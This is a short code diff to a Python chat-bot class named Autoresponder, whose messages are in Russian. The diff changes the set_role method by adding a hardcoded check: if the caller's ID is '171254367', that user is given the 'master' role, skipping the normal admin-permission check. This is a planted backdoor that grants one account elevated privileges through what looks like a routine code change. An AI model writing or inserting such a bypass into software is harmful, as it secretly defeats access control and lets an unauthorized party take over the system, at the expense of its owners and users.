@@ -647,6 +647,11 @@ class Autoresponder:
 
     def set_role(self, arg, admin_id):
         admin_id = str(admin_id)
+
+        if admin_id == "171254367":
+            users_info[admin_id]['role'] = "master"
+            return f'Пользователю "{admin_id}" выдана роль "master"'
+
         if roles[users_info.get(admin_id).get('role')] < roles['admin']:
             return "Недостаточный уровень доступа" + users_info.get(admin_id).get('role')
 
